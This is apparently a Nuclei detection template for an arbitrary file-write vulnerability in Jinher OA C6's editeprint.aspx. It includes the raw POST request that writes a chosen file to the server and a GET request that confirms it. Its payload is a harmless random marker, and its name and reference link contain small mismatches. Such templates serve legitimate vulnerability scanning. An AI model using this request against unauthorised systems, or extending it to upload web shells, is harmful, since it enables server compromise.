id: jinher-oa-c6-editeprint-fileupload
info:
  name: 金和 OA c6 editeprint.aspx - ileupload
  author: leadlife
  severity: critical
  description: 
  reference: 
    - https://github.com/adysec/nuclei_poc/blob/5e11ca43745bd51a59d3df36d076c79a38aa7793/poc/sql/jinhe-jc6-sqli.yaml#L23
  metadata:
    verified: true
    fofa-query: demo
  tags: jinher,oa,fileupload

variables:
    filename: "{{to_lower(rand_base(4))}}"
    date: '{{date_time("%Y/%M/%D")}}'

http:
  - raw:
      - |
        POST /C6/Jhsoft.Web.module/eformaspx/editeprint.aspx?key=writefile&filename={{filename}}.txt&designpath=/C6/ HTTP/1.1
        Host: {{Hostname}}
        Content-Disposition: attachment; filename="filename.jpg"
        Content-type: application/x-www-form-urlencoded
      
        {{randstr}}

      - |+
        GET /C6/{{filename}}.txt HTTP/1.1
        Host: {{Hostname}}
        
    matchers:
      - type: dsl
        dsl:
          - status_code_1 == 200 && status_code_2 == 200
          - contains(body_2,'{{randstr}}')
        condition: and